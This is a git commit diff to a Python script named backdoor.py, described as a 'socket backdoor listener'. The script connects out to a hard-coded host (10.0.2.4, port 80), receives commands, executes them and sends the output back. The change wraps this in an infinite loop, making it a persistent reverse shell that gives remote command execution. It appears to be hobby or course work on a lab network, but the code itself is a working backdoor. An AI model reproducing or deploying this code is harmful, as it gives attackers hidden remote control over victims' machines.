e268e589606a1cac66066174b84fdb056e8cee01
posew7 <posew7@gmail.com>
2019-05-13 02:04:43 -0400

    socket backdoor listener

--- backdoor.py
+++ backdoor.py
@@ -8,8 +8,9 @@ connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connection.connect(("10.0.2.4",80))
 connection.send("Connection OK\n")
 
-command = connection.recv(1024)
-command_output = command_exe(command)
-connection.send(command_output)
+while(True):
+    command = connection.recv(1024)
+    command_output = command_exe(command)
+    connection.send(command_output)
 
 connection.close()
